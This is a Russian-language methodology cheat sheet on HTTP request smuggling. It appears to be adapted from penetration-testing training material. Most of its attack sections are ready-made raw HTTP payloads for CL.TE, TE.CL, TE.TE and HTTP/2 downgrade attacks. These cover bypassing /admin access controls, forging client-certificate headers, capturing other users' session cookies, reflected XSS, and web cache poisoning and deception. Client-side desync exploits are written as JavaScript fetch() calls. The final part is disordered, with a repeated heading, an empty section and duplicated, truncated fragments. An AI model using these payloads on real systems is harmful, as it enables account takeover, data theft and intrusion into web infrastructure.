**Контрабанда HTTP-запросов (HTTP Request Smuggling)**

> Контрабанда HTTP-запросов происходит, когда несколько «сущностей» обрабатывают запрос, но расходятся во мнении о том, где запрос начинается и заканчивается. Это разногласие может быть использовано для вмешательства в запрос/ответ другого пользователя или для обхода средств контроля безопасности. Обычно это происходит из-за разной приоритизации HTTP-заголовков (`Content-Length` против `Transfer-Encoding`), различий в обработке некорректных заголовков (например, игнорировать ли заголовки с неожиданными пробелами), из-за понижения версии запроса с более нового протокола или из-за различий в том, когда частичный запрос считается истекшим по тайм-ауту и должен быть отброшен.

# Методология

> Современные веб-приложения часто используют цепочки HTTP-серверов между пользователями и конечной логикой приложения. Пользователи отправляют запросы на сервер front-end (иногда называемый балансировщиком нагрузки или обратным прокси-сервером), а этот сервер пересылает запросы на один или несколько серверов back-end. Этот тип архитектуры становится все более распространенным, а в некоторых случаях и неизбежным в современных облачных приложениях.
Большинство уязвимостей контрабанды HTTP-запросов возникают из-за того, что спецификация HTTP/1 предоставляет два разных способа указать, где заканчивается запрос: заголовок Content-Length и заголовок Transfer-Encoding.

## Уязвимости CL.TE

Фронтенд-сервер использует заголовок `Content-Length`, а бэкенд-сервер использует заголовок `Transfer-Encoding`.

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

* **Пример**:

```http
POST / HTTP/1.1
Host: domain.example.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

## Уязвимости TE.CL

Фронтенд-сервер использует заголовок `Transfer-Encoding`, а бэкенд-сервер использует заголовок `Content-Length`.

* Убедиться, что в Repeater опция «Обновить длину содержимого» не отмечена.
* Включить завершающую последовательность \r\n\r\n после последнего 0

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

* **Пример**:

```http
POST / HTTP/1.1
Host: domain.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86
Content-Length: 4
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0
```

## Уязвимости TE.TE

*   И фронтенд, и бэкенд-серверы поддерживают заголовок `Transfer-Encoding`, но один из серверов можно заставить не обрабатывать его, запутав заголовок каким-либо образом.

```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```
* **Пример**:
```
POST / HTTP/1.1
Host: victim-site.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: xchunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

x=1
0


```
# Подтверждение уязвимостей подмены HTTP-запросов с использованием дифференциальных ответов

> Если вероятная уязвимость подмены запросов обнаружена, можно получить дополнительные доказательства уязвимости, эксплуатируя ее для вызова различий в содержимом ответов приложения. 

```python
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```
Этот запрос обычно получает HTTP-ответ с кодом состояния 200, содержащий некоторые результаты поиска.

## Подтверждение уязвимостей CL.TE с помощью дифференциальных ответов

```python
POST /search HTTP/1.1
Host: affected-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```
Это приведет к тому, что последующий «нормальный» запрос будет выглядеть следующим образом:
```python
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: affected-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

## Подтверждение уязвимостей TE.CL с помощью дифференциальных ответов

```python
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
```

* В меню Repeater и убедиться, что опция «Обновить длину содержимого» не отмечена.
* Включить завершающую последовательность \r\n\r\n после последнего 0.

Последующий «нормальный» запрос будет выглядеть следующим образом:

```python
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 146

x=
0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

* *Примечание:*
> Запрос «атака» и «нормальный» запрос следует отправлять на сервер с использованием разных сетевых подключений. Отправка обоих запросов через одно и то же подключение не докажет, что уязвимость существует.
>
> Запрос «атака» и «нормальный» запрос должны использовать одинаковые URL и имена параметров, насколько это возможно. Это связано с тем, что многие современные приложения направляют запросы front-end на разные внутренние серверы на основе URL и параметров. Использование одного и того же URL и параметров увеличивает вероятность того, что запросы будут обработаны одним и тем же внутренним сервером, что необходимо для срабатывания атаки.
>
> При тестировании «нормального» запроса для обнаружения помех от запроса «атака» вы соревнуетесь с любыми другими запросами, которые приложение получает в то же время, включая запросы от других пользователей. Вы должны отправить «нормальный» запрос сразу после запроса «атака». Если приложение занято, вам может потребоваться выполнить несколько попыток для подтверждения уязвимости.
>
> В некоторых приложениях сервер front-end выполняет функцию балансировщика нагрузки и пересылает запросы на разные внутренние системы в соответствии с некоторым алгоритмом балансировки нагрузки. Если ваши запросы «атака» и «нормальный» пересылаются на разные внутренние системы, то атака не удастся. Это дополнительная причина, по которой вам может потребоваться несколько попыток, прежде чем уязвимость будет подтверждена.
>
>  Если ваша атака успешно вмешалась в последующий запрос, но это не был «нормальный» запрос, который вы отправили для обнаружения помех, то это означает, что другой пользователь приложения пострадал от вашей атаки. Если вы продолжите выполнять тест, это может оказать разрушительное воздействие на других пользователей, и вам следует проявить осторожность.

# Использование уязвимостей подмены HTTP-запросов

## Использование подмены HTTP-запросов для обхода элементов управления безопасностью на стороне клиента

> В некоторых приложениях веб-сервер на стороне клиента используется для реализации некоторых элементов управления безопасностью, решая, разрешать ли обработку отдельных запросов. Разрешенные запросы пересылаются на внутренний сервер, где они считаются прошедшими через элементы управления на стороне клиента.

```python
POST /home HTTP/1.1
Host: victimsite.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: victimsite.com
Foo: xGET /home HTTP/1.1
Host: victimsite.com


```
> Фронтенд-сервер видит здесь два запроса, оба для /home, и поэтому запросы перенаправляются на внутренний сервер. Однако внутренний сервер видит один запрос для /home и один запрос для /admin. 

## Выявление перезаписи запросов front-end

* Сервер front-end может может:
   * завершить соединение TLS и добавить несколько заголовков, описывающих протокол и используемые шифры;
   * добавить заголовок X-Forwarded-For, содержащий IP-адрес пользователя;
   * определить идентификатор пользователя на основе его токена сеанса и добавить заголовок, идентифицирующий пользователя;
   * добавить некоторую конфиденциальную информацию, которая представляет интерес для других атак.

В некоторых ситуациях, если отсутствуют некоторые заголовки, которые обычно добавляются сервером front-end, то сервер back-end может не обрабатывать запросы обычным образом, в результате чего запросы не будут иметь предполагаемого эффекта.

*Прим.* иногда можно заменить метод запроса на `TRACE`

* Часто существует простой способ выявить, как именно сервер front-end переписывает запросы:
   * Найти запрос POST, который отражает значение параметра запроса в ответе приложения.
   * Перетасовать параметры так, чтобы отраженный параметр оказался последним в теле сообщения.
   * Передать этот запрос контрабандой на сервер back-end, а затем сразу обычный запрос, переписанную форму которого вы хотите раскрыть.

```python
POST / HTTP/1.1
Host: victim.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 167
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Host: victim.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

search=xPOST / HTTP/1.1
Host: victim.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 177
Transfer-Encoding: chunked


```
Запросы будут перезаписаны сервером front-end для включения дополнительных заголовков, а затем сервер back-end обработает контрабандный запрос и будет рассматривать перезаписанный второй запрос как значение параметра. 

* Затем он отразит это значение обратно в ответе на второй запрос:
```python
<h1>0 search results for 'POST / HTTP/1.1
X-izpQRy-Ip: 46.8.230.199
Host: victim.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 167
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Host: victim.com'</h1>
```

*Примечание:*
Поскольку окончательный запрос перезаписывается неизвестно какой длины он в итоге будет. Значение в заголовке Content-Length в контрабандном запросе определит, насколько длинным, по мнению внутреннего сервера, будет запрос. 
* Если установить это значение слишком коротким, получу только часть переписанного запроса; 
* если установите его слишком длинным, внутренний сервер прервется в ожидании завершения запроса.

Необходимо угадать начальное значение, которое немного больше отправленного запроса, а затем постепенно увеличивать значение, чтобы получить больше информации, пока не будет получено все интересное.

## Обход аутентификации клиента

> В рамках рукопожатия TLS серверы аутентифицируются с клиентом (обычно браузером), предоставляя сертификат. Этот сертификат содержит их «общее имя» (CN), которое должно соответствовать их зарегистрированному имени хоста. Затем клиент может использовать его, чтобы убедиться, что он общается с законным сервером, принадлежащим ожидаемому домену.
>
>> Некоторые сайты идут на шаг дальше и реализуют форму взаимной аутентификации TLS, где клиенты также должны предоставить сертификат серверу. В этом случае CN клиента часто является именем пользователя или чем-то подобным, что может использоваться в логике внутреннего приложения как часть механизма контроля доступа, например.

Компонент, который аутентифицирует клиента, обычно передает соответствующие данные из сертификата в приложение или внутренний сервер через один или несколько нестандартных заголовков HTTP. Например, фронтенд-серверы иногда добавляют заголовок, содержащий CN клиента, к любым входящим запросам:
```
GET /admin HTTP/1.1
Хост: normal-website.com
X-SSL-CLIENT-CN: carlos
```
Поскольку эти заголовки должны быть полностью скрыты от пользователей, им часто неявно доверяют внутренние серверы. 

На практике такое поведение обычно не может быть использовано, поскольку фронтенд-серверы, как правило, перезаписывают эти заголовки, если они уже присутствуют. Однако контрабандные запросы полностью скрыты от front-end, поэтому любые заголовки, которые они содержат, будут отправлены back-end без изменений.

```python
POST /example HTTP/1.1
Host: victim-site.com
Content-Type: x-www-form-urlencoded
Content-Length: 64
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-SSL-CLIENT-CN: administrator
Foo: x
```


## Захват запросов других пользователей

> Если приложение содержит какие-либо функции, которые позволяют вам хранить и позже извлекать текстовые данные, вы потенциально можете использовать это для захвата содержимого запросов других пользователей. Они могут включать токены сеансов или другие конфиденциальные данные, отправленные пользователем. Подходящими функциями для использования в качестве средства для этой атаки будут `комментарии`, `электронные письма`, `описания профилей`, `имена экранов` и т. д.
```python
POST /post/comment HTTP/1.1
Хост: victim-website.com
Тип контента: application/x-www-form-urlencoded
Длина контента: 154
Файл cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Normis+Man&email=normal%40normal-user.net&website=https%3A%2F%2Fnormal-user.net
```
Если переслать эквивалентный запрос с слишком длинным заголовком Content-Length и параметром комментария, расположенным в конец запроса следующим образом:
```python
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 330

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
```
Заголовок Content-Length указывает, что тело будет длиной 400 байт, но мы отправили только 144 байта. В этом случае внутренний сервер будет ждать оставшиеся 256 байт, прежде чем выдать ответ, или же выдаст тайм-аут, если он не придет достаточно быстро. В результате, когда другой запрос отправляется на внутренний сервер по тому же соединению, первые 256 байт фактически добавляются к запросу следующим образом:
```python
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=GET / HTTP/1.1
Host: vulnerable-website.com
Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
... 
```

* *Примечание:*
Одним из ограничений этого метода является то, что он, как правило, захватывает данные только до разделителя параметров, который применим к контрабандному запросу. Для отправленных форм с кодировкой URL это будет символ `&`, что означает, что содержимое, сохраненное из запроса пользователя, будет заканчиваться на первом &, который может даже появиться в строке запроса

## Использование HTTP Request Smuggling для эксплуатации отраженного XSS

* не нужно давать им URL-адрес и ждать, пока они его посетят. Запрос, содержащий полезную нагрузку XSS, и следующий запрос пользователя, обработанный внутренним сервером, будет атакован.
* можно использовать для эксплуатации поведения XSS в частях запроса, которые нельзя тривиально контролировать в обычной атаке отраженного XSS, например, в заголовках HTTP-запросов.

```python
POST / HTTP/1.1
Host: affected-website.com
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
User-Agent: <script>alert(1)</script>
Foo: X
```

## Использование HTTP Request Smuggling для превращения внутреннего перенаправления в открытое перенаправление
> Многие приложения выполняют внутренние перенаправления с одного URL на другой и помещают имя хоста из заголовка Host запроса в URL перенаправления. Примером этого является поведение по умолчанию веб-серверов Apache и IIS, где запрос на папку без завершающего слеша получает перенаправление в ту же папку, включая завершающий слеш.

```python
GET /home HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Такое поведение обычно считается безвредным, но его можно использовать в атаке с подменой запроса для перенаправления других пользователей на внешний домен.
```python
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Подменой запрос вызовет перенаправление на веб-сайт злоумышленника, что повлияет на следующий запрос пользователя, который обрабатывается внутренним сервером.

```python
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```

* **Превращение корневых перенаправлений в открытые перенаправления**

```python
GET /example HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: /example/
```
Это потенциально все еще может быть использовано для открытого перенаправления, если сервер позволяет использовать URL-адрес, относящийся к протоколу, в пути:
```
GET //attacker-website.com/example HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: //attacker-website.com/example/
```

## Использование HTTP Request Smuggling для выполнения атаки отравления веб-кэша

> Если какая-либо часть инфраструктуры front-end выполняет кэширование контента (обычно по соображениям производительности), то можно отравить кэш ответом на перенаправление за пределы сайта. Это сделает атаку постоянной, затрагивая любого пользователя, который впоследствии запросит затронутый URL.

```python
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 59
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /static/include.js HTTP/1.1
Host: vulnerable-website.com
```
Запрос достигает внутреннего сервера, который отвечает, как и прежде, перенаправлением за пределы сайта. Фронтальный сервер кэширует этот ответ в соответствии с тем, что он считает URL-адресом во втором запросе, который является /static/include.js
```
GET /static/include.js HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
С этого момента, когда другие пользователи запрашивают этот URL-адрес, они получают перенаправление.

## Использование HTTP Request Smuggling для выполнения обмана веб-кэша

> Приложение сохраняет конфиденциальный контент, принадлежащий другому пользователю, в кэше, а затем извлекает этот контент из кэша.

```python
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 43
Transfer-Encoding: chunked

0

GET /private/messages HTTP/1.1
X-Ignore: X
--------none \r\n---------
```
Следующий запрос от другого пользователя, который пересылается на внутренний сервер, будет добавлен к тайно отправленному запросу, включая файлы cookie сеанса и другие заголовки. 

```python
GET /private/messages HTTP/1.1
Foo: XGET /static/some-image.png HTTP/1.1
Host: affected-website.com
Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z
...
```
Бэкэнд-сервер отвечает на этот запрос обычным образом. URL в запросе относится к личным сообщениям пользователя, а запрос обрабатывается в контексте сеанса пользователя-жертвы. Фронтенд-сервер кэширует этот ответ по тому, что он считает URL-адресом во втором запросе, который является /static/some-image.png:

```python
GET /static/some-image.png HTTP/1.1
Хост: victim-website.com

HTTP/1.1 200 Ok
...
<h1>API</h1>
...
```
Может потребоваться получить большое количество статических URL-адресов, чтобы обнаружить захваченный контент.

# Расширенный HTTP Request Smuggling

## HTTP Request Smuggling HTTP/2

Контрабанда запросов HTTP/2 может произойти, если сервер конвертирует ваш HTTP/2 запрос в HTTP/1.1, и вы можете протащить некорректный заголовок `content-length`, заголовок `transfer-encoding` или символы новой строки (`CRLF`) в преобразованный запрос. Контрабанда запросов HTTP/2 также может произойти в GET-запросе, если вы можно спрятать HTTP/1.1 запрос внутри HTTP/2 заголовка.

```http
:method GET
:path /
:authority www.example.com
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: www.example.com
```
* **Уязвимости H2.CL**
  
> Запросы HTTP/2 не должны явно указывать свою длину в заголовке. Во время понижения версии это означает, что серверы переднего плана часто добавляют заголовок HTTP/1 Content-Length, выводя его значение с помощью встроенного механизма длины HTTP/2. Запросы HTTP/2 также могут включать свой собственный заголовок content-length. В этом случае некоторые серверы front-end просто повторно используют это значение в результирующем запросе HTTP/1.

```python
* Front-end (HTTP/2)
:method POST
:path /example
:authority victim-website.com
content-type application/x-www-form-urlencoded
content-length 0

GET /admin HTTP/1.1
Host: victim-website.com
Content-Length: 10

x=1
---------------------------------
* Back-end (HTTP/1)
POST /example HTTP/1.1
Host: victim-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /admin HTTP/1.1
Host: victim-website.com
Content-Length: 10

x=1GET / H
```

* **Уязвимости H2.TE**

Кодирование передачи фрагментов несовместимо с HTTP/2, и спецификация рекомендует, чтобы любой заголовок transfer-encoding: chunked, который пытаются внедрить, был удален или запрос был полностью заблокирован. Если фронтенд-сервер не может этого сделать и впоследствии понижает запрос до бэкенда HTTP/1, который поддерживает кодирование фрагментов, это также может привести к атакам контрабанды запросов.

```python
Front-end (HTTP/2)
:method POST
:path /example
:authority affected-website.com
content-type application/x-www-form-urlencoded
transfer-encoding chunked

0

GET /admin HTTP/1.1
Host: affected-website.com
Foo: bar

Back-end (HTTP/1)
POST /example HTTP/1.1
Host: affected-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: affected-website.com
Foo: bar
```
# Расширенный HTTP Request Smuggling

## HTTP Request Smuggling HTTP/2
### HTTP/2-эксклюзивные векторы

* **Контрабанда запросов посредством внедрения CRLF**

> В HTTP/1 иногда можно использовать несоответствия между тем, как серверы обрабатывают отдельные символы новой строки (\n), чтобы пересылать запрещенные заголовки. Если бэкэнд обрабатывает это как разделитель, а фронтэнд-сервер — нет, некоторые фронтэнд-серверы вообще не смогут обнаружить второй заголовок.
Foo: bar\nTransfer-Encoding: chunked

```python
POST / HTTP/2

Foo: barTransfer-Encoding: chunked (inspector = req-header)

Content-Length: 900
Content-Type: application/x-www-form-urlencoded

search=1
-------none \r\n-------
```

* **Инъекция через имена заголовков**

В HTTP/1 имя заголовка не может содержать двоеточие, поскольку этот символ используется для указания конца имени для парсеров. В HTTP/2 это не так.

Объединяя двоеточия с символами \r\n, вы можете использовать поле имени заголовка HTTP/2, чтобы протащить другие заголовки мимо фильтров интерфейса. Затем они будут интерпретироваться как отдельные заголовки на бэкенде после того, как запрос будет переписан с использованием синтаксиса HTTP/1:

Фронт-энд (HTTP/2)
foo: bar\r\nTransfer-Encoding: chunked\r\nX: ignore

Бэк-энд (HTTP/1)
Foo: bar\r\n
Transfer-Encoding: chunked\r\n
X: ignore\r\n
__________________________________________

* **Внедрение через псевдозаголовки**

HTTP/2 не использует строку запроса или строку состояния. Вместо этого эти данные передаются через серию «псевдозаголовков» в начале запроса. В текстовых представлениях сообщений HTTP/2 они обычно имеют префикс в виде двоеточия, чтобы отличать их от обычных заголовков. Всего существует пять псевдозаголовков:

:method — Метод запроса.

:path — Путь запроса. Обратите внимание, что сюда входит строка запроса.

:authority — примерно эквивалентно заголовку HTTP/1 Host.

:scheme — схема запроса, обычно http или https.

:status — код статуса ответа (не используется в запросах).

Когда веб-сайты понижают запросы до HTTP/1, они используют значения некоторых из этих псевдозаголовков для динамического построения строки запроса. Это открывает некоторые интересные новые способы построения атак.

1. **Предоставление неоднозначного хоста**

Хотя заголовок HTTP/1 Host фактически заменяется псевдозаголовком :authority в HTTP/2, вам по-прежнему разрешено отправлять заголовок хоста в запросе.

В некоторых случаях это может привести к появлению двух заголовков Host в переписанном запросе HTTP/1, что открывает еще одну возможность для обхода фильтров «дублирующий заголовок Host» на интерфейсе, например. Это потенциально делает сайт уязвимым для ряда атак на заголовки Host, к которым он в противном случае мог бы быть невосприимчив.

2. **Предоставление неоднозначного пути**

Попытка отправить запрос с неоднозначным путем невозможна в HTTP/1 из-за способа анализа строки запроса. Но поскольку путь в HTTP/2 указывается с помощью псевдозаголовка, теперь можно отправить запрос с двумя различными путями следующим образом:
:method POST
:path /anything
:path /admin
:authority affected-website.com

Если есть несоответствие между тем, какой путь проверяется средствами управления доступом веб-сайта, и тем, какой путь используется для маршрутизации запроса, это может позволить вам получить доступ к конечным точкам, которые в противном случае были бы недоступны.

3. **Внедрение полной строки запроса**

Во время понижения версии значение псевдозаголовка :method будет записано в самое начало результирующего запроса HTTP/1. Если сервер позволяет включать пробелы в значение :method, вы можете внедрить совершенно другую строку запроса следующим образом:

Front-end (HTTP/2)
:method GET /admin HTTP/1.1
:path /anything
:authority affected-website.com

Back-end (HTTP/1)
GET /admin HTTP/1.1 /anything HTTP/1.1
Хост: affected-website.com

Если сервер также допускает произвольные конечные символы в строке запроса, это обеспечивает еще один способ создания запроса с неоднозначным путем.

4. **Внедрение префикса URL**

Еще одна интересная функция HTTP/2 — возможность явно указывать схему в самом запросе с помощью псевдозаголовка :scheme. Хотя обычно он просто содержит http или https, вы можете включить произвольные значения.

Это может быть полезно, когда сервер использует заголовок :scheme для динамической генерации URL, например. В этом случае вы можете добавить префикс к URL или даже полностью переопределить его, вставив реальный URL в строку запроса:

Запрос
:method GET
:path /anything
:authority affected-website.com
:scheme https://evil-user.net/poison?

Ответ
:status 301
location https://evil-user.net/poison?://vulnerable-website.com/anything/

5. **Внедрение новых строк в псевдозаголовки**

При внедрении в псевдозаголовки :path или :method вам необходимо убедиться, что полученный запрос HTTP/1 все еще имеет допустимую строку запроса.

Поскольку \r\n завершает строку запроса в HTTP/1, простое добавление \r\n на полпути просто нарушит запрос. После понижения версии переписанный запрос должен содержать следующую последовательность перед первым \r\n, который вы внедряете:

<method> + пробел + <path> + пробел + HTTP/1.1

Просто визуализируйте, где ваша инъекция попадает в эту последовательность, и включите все оставшиеся части соответствующим образом. Например, при внедрении в :path вам необходимо добавить пробел и HTTP/1.1 перед \r\n следующим образом:

Front-end (HTTP/2)
:method GET
:path

/example HTTP/1.1\r\n
Transfer-Encoding: chunked\r\n
X: x
:authority affected-website.com

Back-end (HTTP/1)
GET /example HTTP/1.1\r\n
Transfer-Encoding: chunked\r\n
X: x HTTP/1.1\r\n
Host: affected-website.com\r\n
\r\n

Обратите внимание, что в этом случае мы также добавили произвольный конечный заголовок, чтобы уловить пробел и протокол, которые были добавлены автоматически во время перезаписи.
__________________________________________

* **Скрытая поддержка HTTP/2**

Браузеры и другие клиенты, включая Burp, обычно используют HTTP/2 только для связи с серверами, которые явно объявляют о его поддержке через ALPN как часть рукопожатия TLS.

Некоторые серверы поддерживают HTTP/2, но не заявляют об этом должным образом из-за неправильной настройки. В таких случаях может показаться, что сервер поддерживает только HTTP/1.1, поскольку клиенты по умолчанию используют его в качестве резервного варианта. В результате тестировщики могут упустить из виду жизнеспособную поверхность атаки HTTP/2 и пропустить проблемы на уровне протокола, такие как примеры контрабанды запросов на основе понижения версии HTTP/2, которые мы рассмотрели выше.

Чтобы заставить Burp Repeater использовать HTTP/2, чтобы вы могли вручную проверить эту неправильную настройку:

В диалоговом окне «Настройки» перейдите в «Инструменты» > «Повторитель».
В разделе «Подключения» включите параметр «Разрешить переопределение HTTP/2 ALPN».
В «Повторителе» перейдите на панель «Инспектор» и разверните раздел «Атрибуты запроса».
Используйте переключатель, чтобы задать протоколу значение HTTP/2. Теперь Burp будет отправлять все запросы на этой вкладке с использованием HTTP/2, независимо от того, объявляет ли сервер о поддержке этого.

## Отравление очереди ответов






















### Десинхронизация на стороне клиента (Client-Side Desync)

На некоторых путях серверы не ожидают POST-запросов и обрабатывают их как простые GET-запросы, игнорируя тело, например:

```http
POST / HTTP/1.1
Host: www.example.com
Content-Length: 37

GET / HTTP/1.1
Host: www.example.com
```

Это может быть воспринято как два запроса, хотя должен быть один. Когда бэкенд-сервер отвечает дважды, фронтенд-сервер будет считать, что только первый ответ связан с этим запросом.

Чтобы использовать это, атакующий может с помощью JavaScript заставить жертву отправить POST на уязвимый сайт:

```javascript
fetch('https://www.example.com/', {method: 'POST', body: "GET / HTTP/1.1\r\nHost: www.example.com", mode: 'no-cors', credentials: 'include'} )
```

Это может быть использовано для:

*   Заставить уязвимый сайт сохранить учетные данные жертвы в месте, доступном для атакующего.
*   Заставить жертву отправить эксплойт на сайт (например, на внутренние сайты, к которым у атакующего нет доступа, или чтобы затруднить атрибуцию атаки).
*   Заставить жертву выполнить произвольный JavaScript, как если бы он исходил от самого сайта.

* **Пример**:

```javascript
fetch('https://www.example.com/redirect', {
    method: 'POST',
        body: `HEAD /404/ HTTP/1.1\r\nHost: www.example.com\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
        credentials: 'include',
        mode: 'cors' // throw an error instead of following redirect
}).catch(() => {
        location = 'https://www.example.com/'
})
```

Этот скрипт приказывает браузеру жертвы отправить POST-запрос на `www.example.com/redirect`. Этот запрос возвращает редирект, который блокируется CORS, что приводит к выполнению блока `catch` и переходу на `www.example.com`.

`www.example.com` теперь некорректно обрабатывает запрос `HEAD` из тела POST-запроса вместо GET-запроса браузера, возвращает `404 Not Found` с `content-length`, затем отвечает на следующий неверно истолкованный третий запрос (`GET /x?x=<script>...`) и, наконец, на фактический GET-запрос браузера. Поскольку браузер отправил только один запрос, он принимает ответ на `HEAD` запрос как ответ на свой `GET` запрос и интерпретирует третий и четвертый ответы как тело ответа, выполняя тем самым скрипт атакующего.

4. Обход аутентификации клиента
Некоторые сайты идут на шаг дальше и реализуют форму взаимной аутентификации TLS, где клиенты также должны предоставить сертификат серверу. В этом случае CN клиента часто является именем пользователя или чем-то подобным, что может использоваться в логике внутреннего приложения как часть механизма контроля доступа, например.
Компонент, который аутентифицирует клиента, обычно передает соответствующие данные из сертификата в приложение или внутренний сервер через один или несколько нестандартных заголовков HTTP. Например, фронтенд-серверы иногда добавляют заголовок, содержащий CN клиента, к любым входящим запросам:
GET /admin HTTP/1.1
Хост: normal-website.com
X-SSL-CLIENT-CN: carlos
5. Захват запросов других пользователей
Подходящими функциями для использования в качестве средства для этой атаки будут комментарии(перетасуйте параметры тела так, чтобы параметр comment оказался последним, и убедитесь, что он все еще работает), электронные письма, описания профилей, имена экранов и т. д.
Вы перешлете эквивалентный запрос с слишком длинным заголовком Content-Length и параметром комментария, расположенным в конец запроса, тело будет длиной 400 байт, но мы отправили только 144 байта. В этом случае внутренний сервер будет ждать оставшиеся 256 байт, прежде чем выдать ответ, или же выдаст тайм-аут, если он не придет достаточно быстро. В результате, когда другой запрос отправляется на внутренний сервер по тому же соединению, первые 256 байт фактически добавляются к контрабандному запросу
Чтобы захватить больше запроса жертвы, вам просто нужно соответственно увеличить значение заголовка Content-Length контрабандного запроса, но учтите, что это потребует определенного количества проб и ошибок. Если вы столкнетесь с тайм-аутом, это, вероятно, означает, что указанный вами Content-Length больше фактической длины запроса жертвы. В этом случае просто уменьшите значение, пока атака не сработает снова.
Захватывает данные только до разделителя параметров, который применим к контрабандному запросу. Для отправленных форм с кодировкой URL это будет символ &, что означает, что содержимое, сохраненное из запроса пользователя-жертвы, будет заканчиваться на первом &, который может даже появиться в строке запроса.
6. Использование контрабанды HTTP-запросов для эксплуатации отраженного XSS
Его можно использовать для эксплуатации поведения XSS в частях запроса, которые нельзя тривиально контролировать в обычной атаке отраженного XSS, например, в заголовках HTTP-запросов.
Например, предположим, что приложение имеет отраженную уязвимость XSS в заголовке User-Agent. Вы можете использовать это в атаке контрафактного запроса следующим образом:

Transfer-Encoding: chunked

7. Использование контрафактного HTTP-запроса для превращения внутреннего перенаправления в открытое перенаправление
Многие приложения выполняют внутренние перенаправления с одного URL на другой и помещают имя хоста из заголовка Host запроса в URL перенаправления. Примером этого является поведение по умолчанию веб-серверов Apache и IIS, где запрос на папку без завершающего слеша получает перенаправление в ту же папку, включая завершающий слеш:
GET /home HTTP/1.1
Host: normal-website.com
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
